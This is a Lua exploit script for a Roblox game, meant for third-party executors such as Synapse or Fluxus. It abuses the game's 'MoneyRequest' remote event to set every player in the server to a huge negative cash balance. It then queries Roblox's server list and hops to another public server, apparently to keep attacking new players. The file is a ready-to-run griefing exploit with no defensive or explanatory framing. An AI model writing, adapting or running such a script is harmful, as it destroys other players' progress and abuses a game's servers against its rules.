if game.PlaceId == 23578803 then
 local httprequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
 local PlaceId, JobId = game.PlaceId, game.JobId
 local Players = game:GetService("Players")
 local TeleportService = game:GetService("TeleportService")
 local HttpService = game:GetService("HttpService")
   if game:GetService("Workspace").Chopper.TailRotor.Transparency == 0 then
Players = game:GetService("Players")
for i, plr in pairs(Players:GetPlayers()) do
local args = {
[1] = false,
[2] =-100000000000, -- you can change this to give more/less cash
[3] = "Cash",
[4] = plr
}

game:GetService("ReplicatedStorage").MoneyRequest:FireServer(unpack(args))
end
        task.wait(3)
        if httprequest then
   local servers = {}
   local req = httprequest({Url = string.format("https://games.roblox.com/v1/games/%s/servers/Public?sortOrder=Asc&limit=100", PlaceId)})
   local body = HttpService:JSONDecode(req.Body)
   if body and body.data then
    for i, v in next, body.data do
     if type(v) == "table" and tonumber(v.playing) and tonumber(v.maxPlayers) and v.playing < v.maxPlayers and v.id ~= JobId then
      table.insert(servers, 1, v.id)
     end 
    end
   end
   if #servers > 0 then
    TeleportService:TeleportToPlaceInstance(PlaceId, servers[math.random(1, #servers)], Players.LocalPlayer)
   else
    print("No server to find!")
   end
  end
   else
   task.wait(1.5)
   if httprequest then
 local servers = {}
 local req = httprequest({Url = string.format("https://games.roblox.com/v1/games/%s/servers/Public?sortOrder=Asc&limit=100", PlaceId)})
 local body = HttpService:JSONDecode(req.Body)
 if body and body.data then
  for i, v in next, body.data do
   if type(v) == "table" and tonumber(v.playing) and tonumber(v.maxPlayers) and v.playing < v.maxPlayers and v.id ~= JobId then
    table.insert(servers, 1, v.id)
   end 
  end
 end
 if #servers > 0 then
  TeleportService:TeleportToPlaceInstance(PlaceId, servers[math.random(1, #servers)], Players.LocalPlayer)
 else
  print("No server to find!")
 end
end
   end
end 